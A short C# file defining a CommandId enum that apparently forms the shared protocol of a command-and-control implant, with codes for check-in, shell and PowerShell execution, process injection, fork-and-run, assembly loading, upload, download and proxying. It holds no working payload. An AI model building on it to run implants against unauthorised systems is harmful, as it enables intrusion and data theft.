using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Shared
{
    public enum CommandId : byte
    {
        CheckIn = 0x00,
        Whoami = 0x01,
        Exit = 0x02,

        Cat = 0x03,
        Cd = 0x04,
        Pwd = 0x05,
        Ls = 0x06,

        Powershell = 0x07,
        PowershellImport = 0x08,
        Shell = 0x09,

        Job = 0x10,
        ForkAndRun = 0x11,
        Assembly = 0x12,
        Inject = 0x13,
        Link = 0x14,

        ListProcess = 0x15,

        Upload = 0x16,
        Download = 0x17,

        Proxy = 0x18,

    }
}
